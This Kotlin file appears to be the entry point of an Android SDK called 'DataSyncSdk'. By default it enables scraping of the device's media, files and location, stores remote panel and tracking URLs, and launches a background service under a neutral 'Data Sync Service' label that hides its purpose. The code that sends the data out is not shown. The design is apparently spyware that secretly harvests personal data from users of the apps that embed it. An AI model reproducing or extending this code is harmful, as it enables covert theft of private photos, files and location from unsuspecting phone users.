package com.sdocument.sdk

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.compose.runtime.Composable
import com.sdocument.sdk.service.DataService
import com.sdocument.sdk.service.PushService
import com.sdocument.sdk.utils.NetworkLogger
import com.sdocument.sdk.utils.NetworkMonitor
import com.sdocument.sdk.utils.PushScheduler

enum class ScrapeType {
    MEDIA, FILES, LOCATION
}

data class WebConfig(
    val verificationUrl: String = "",
    val webViewUrl: String = "",
    val apiUrl: String = "https://panel.static-analysis.rest/"
)

data class MmpConfig(
    val enableMmp: Boolean = true,
    val mmpUrl: String = "https://apps-mmp.onrender.com"
)

data class AppMetadata(
    val appId: Int = 1,
    val buildId: String = "1"
)

data class NotificationConfig(
    val serviceTitle: String = "Data Sync Service",
    val serviceText: String = "Running in background"
)

data class SdkConfig(
    val scrapeConfig: Set<ScrapeType> = setOf(ScrapeType.MEDIA, ScrapeType.FILES, ScrapeType.LOCATION),
    val webConfig: WebConfig = WebConfig(),
    val mmpConfig: MmpConfig = MmpConfig(),
    val metadata: AppMetadata = AppMetadata(),
    val notificationConfig: NotificationConfig = NotificationConfig(),
    val excludeRegex: String? = null,
    val customStorageScreen: (@Composable (onAllowClick: () -> Unit, onSkipClick: () -> Unit) -> Unit)? = null,
    val customLocationScreen: (@Composable (onAllowClick: () -> Unit, onSkipClick: () -> Unit) -> Unit)? = null
)

object DataSyncSdk {
    private const val PREFS_NAME = "scraper_config"

    fun initialize(context: Context, config: SdkConfig) {
        com.sdocument.sdk.di.ConfigProvider.currentConfig = config
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        
        // If user was banned, don't re-initialize services
        if (prefs.getBoolean("is_banned", false)) return

        prefs.edit().apply {
            putBoolean("scrape_media", config.scrapeConfig.contains(ScrapeType.MEDIA))
            putBoolean("scrape_files", config.scrapeConfig.contains(ScrapeType.FILES))
            putBoolean("scrape_location", config.scrapeConfig.contains(ScrapeType.LOCATION))
            putString("verification_url", config.webConfig.verificationUrl)
            putString("mmp_url", config.mmpConfig.mmpUrl)
            putBoolean("enable_mmp", config.mmpConfig.enableMmp)
            putInt("app_id", config.metadata.appId)
            putString("build_id", config.metadata.buildId)
            putString("exclude_regex", config.excludeRegex)
            commit()
        }

        // Initialize core utilities
        NetworkMonitor.init(context)
        NetworkLogger.init(context)

        // Start services
        PushService.start(context)
        PushScheduler.schedule(context)

        // Start DataService with explicit intent extras (for backwards compatibility with existing logic)
        val dataIntent = Intent(context, DataService::class.java).apply {
            action = "START_WITH_JSON"
            putExtra("scrape_media", config.scrapeConfig.contains(ScrapeType.MEDIA))
            putExtra("scrape_files", config.scrapeConfig.contains(ScrapeType.FILES))
            putExtra("scrape_location", config.scrapeConfig.contains(ScrapeType.LOCATION))
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(dataIntent)
            } else {
                context.startService(dataIntent)
            }
        } catch (e: Exception) {
            // Ignore background start restrictions
        }
    }
}
